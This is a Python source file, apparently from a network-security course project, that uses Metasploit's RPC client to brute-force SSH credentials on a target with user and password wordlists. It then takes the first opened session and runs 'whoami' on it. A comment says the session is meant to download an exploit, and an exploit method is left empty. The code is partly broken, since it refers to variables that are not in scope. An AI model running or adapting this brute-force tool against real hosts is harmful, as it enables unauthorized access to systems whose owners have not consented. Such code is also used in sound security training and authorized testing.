from pymetasploit3.msfrpc import MsfRpcClient
import time


class GainingAccess():
    def __init__(self, target_ip, target_port):
        self.ip = target_ip
        self.port = target_port
    
    # exploiting the target using ssh_login auxiliary module
    def openShellSession(self):
        client = MsfRpcClient('1234')

        try:
            auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
            auxiliary['PASS_FILE'] = '/RanD/Pycharm-Community/PycharmProjects/netsec-project/modules/resources/password.lst'
            auxiliary['USER_FILE'] = '/RanD/Pycharm-Community/PycharmProjects/netsec-project/modules/resources/user.lst'
            auxiliary['RHOSTS'] = target_ip
            auxiliary['RPORT'] = 22

            execute = auxiliary.execute()
            print(execute)
            
            # let the exploit work and finish to open the session
            time.sleep(600)

        except Exception as e:
            print(e)
    
    # send the command trouch the open session to download the exploit       
    def sendCommand(self):
        print("Sessions available: ")
        for s in client.sessions.list.keys():
            print(s)
            
        shell = client.sessions.session(list(client.sessions.list.keys())[0])

        # Write to the shell
        # shell.write('whoami')
        shell.write('whoami')
        # Print the output

        print(shell.read())
    
    def exploitTarget(self):
        pass